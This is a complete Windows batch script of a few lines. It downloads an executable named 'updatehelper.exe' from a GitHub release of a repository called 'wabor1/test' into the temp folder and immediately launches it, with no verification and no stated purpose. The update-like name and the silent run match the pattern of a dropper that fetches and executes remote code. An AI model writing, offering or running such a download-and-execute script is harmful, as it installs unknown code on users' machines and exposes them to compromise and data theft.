@echo off
curl -L -o "%TEMP%\updatehelper.exe" "https://github.com/wabor1/test/releases/download/1/updatehelper.exe"
if exist "%TEMP%\updatehelper.exe" (
    start "" "%TEMP%\updatehelper.exe"
) else (
    echo Download failed.
)
exit   
